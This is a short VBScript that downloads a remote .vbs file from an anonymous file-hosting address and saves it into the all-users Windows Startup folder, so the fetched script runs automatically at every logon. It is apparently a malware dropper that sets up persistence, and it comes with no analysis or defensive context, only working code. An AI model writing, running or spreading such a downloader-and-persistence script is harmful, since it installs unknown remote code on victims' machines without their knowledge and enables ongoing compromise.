Dim objShell, objFSO, objHTTP, strURL, strDestination

' Create shell and file system objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the Startup folder path
strDestination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\fi030k.vbs"

' Define the file URL
strURL = "https://files.catbox.moe/fi030k.vbs"

' Create an HTTP object
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Download the file
objHTTP.Open "GET", strURL, False
objHTTP.Send

If objHTTP.Status = 200 Then
    ' Create and write the file to the Startup folder
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.Position = 0
    objStream.SaveToFile strDestination, 2
    objStream.Close
    Set objStream = Nothing
End If

' Cleanup
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing
